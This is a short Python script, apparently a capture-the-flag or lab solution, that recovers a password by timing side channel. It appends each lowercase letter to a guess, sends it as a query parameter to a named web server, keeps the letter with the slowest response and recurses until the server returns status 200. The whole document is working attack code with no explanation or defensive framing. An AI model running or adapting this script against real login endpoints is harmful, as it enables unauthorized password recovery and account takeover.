import requests
import string
import time
from string import ascii_lowercase



def getfirstletter(currentpass):
    savedletter = ""
    maxt = 0
    print(currentpass)
    for x in range(0,26):
        tmpass = currentpass
        start = time.time()
        tmpass += ascii_lowercase[x]
        r = requests.get('http://cloud.doshmajhan.com:5000/?password=' + tmpass)

        stop = time.time()
        if r.status_code == 200:
            return tmpass
        tmptime = stop - start
        print(ascii_lowercase[x], tmptime)
        if tmptime > maxt:
            savedletter = ascii_lowercase[x]
            maxt = tmptime
    return getfirstletter(currentpass + savedletter)

if __name__ == "__main__":
    currentpass = ""
    verified = getfirstletter(currentpass)
    print(verified)
